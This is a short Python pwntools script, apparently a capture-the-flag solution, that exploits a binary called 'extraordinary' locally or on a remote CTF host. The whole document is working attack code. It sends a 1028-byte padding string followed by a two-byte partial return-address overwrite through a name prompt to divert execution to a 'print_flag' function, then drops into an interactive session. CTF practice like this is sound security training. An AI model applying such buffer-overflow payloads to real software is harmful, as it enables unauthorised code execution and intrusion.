from pwn import *
import sys

exe = ELF("./extraordinary")
host = "ctf-85ib.balancedcompo.site" 
port = 9993

def exploit(p):
    print_name = 0x0000000000002739
    print_flag = 0x0000000000006839
    
    padding = "A"*1028
    payload = padding + p16(print_flag)

    sla('> ', '1')
    sla('Enter Name: ', payload)
    sla('> ', '2')

    p.interactive()

if __name__ == "__main__":
    context.binary = exe

    if sys.argv[-1] == "remote":
        p = remote(host, port)
    else:
        p = process([exe.path])
        pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    lg = lambda a : log.info(a)

    exploit(p)
